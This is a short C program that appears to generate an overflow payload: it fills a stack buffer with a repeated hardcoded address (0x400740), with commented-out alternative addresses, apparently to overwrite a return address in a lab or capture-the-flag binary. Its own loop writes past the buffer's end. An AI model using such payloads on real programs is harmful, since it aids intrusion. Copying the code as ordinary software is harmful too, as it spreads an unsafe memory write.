#include <stdio.h>
int main(){
	int i = 0;
	int bufsize = 38;
	//int bound = 2;
	int size = bufsize + 4;
	char buf[size];
	for (i = 0; i < size; i+=4){
		*(long*)&buf[i] = 0x400740;//4005b6;// 0x400736;
	}
	//*(long*)&buf[bufsize + 4] = 0x4005c0;//0x400740;//4005b6;// 0x400736;
	puts(buf);

}
